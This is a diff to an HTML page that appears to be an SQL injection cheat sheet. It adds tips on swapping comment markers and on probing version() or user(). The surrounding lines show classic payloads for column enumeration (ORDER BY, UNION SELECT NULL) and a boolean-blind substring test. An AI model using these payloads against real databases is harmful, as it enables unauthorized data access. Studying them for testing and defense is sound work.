@@ -84,6 +84,8 @@ If the vulnerability is present the goal is to "close" the query and retrieve al
 <b>C1: METHOD </b><mark id="DTT01">' ORDER BY 1--</mark>
 <b>C2: METHOD </b><mark id="DTT02">' UNION SELECT NULL--</mark><br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT01')">.C1.</button> |  <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT02')">.C2.</button><br>
+
+<b>NOTE:</b> change between <b>"--"</b> and <b>"#"</b>
 	
 <u>2. GET FIELD TYPE</u>
 	
@@ -120,6 +122,8 @@ the select statement <u>is needed a table to search from</u>, it can be any tabl
 
 <b>SAMPLE: </b><mark id="">' and substring((version()),1,1) = '0'#</mark>
 
+<b>NOTE:</b> You can use version(), user() etc.
+	
 </details>
 <details>
 <summary>LISTING DATABASE CONTENT TECHNIQUES</summary>
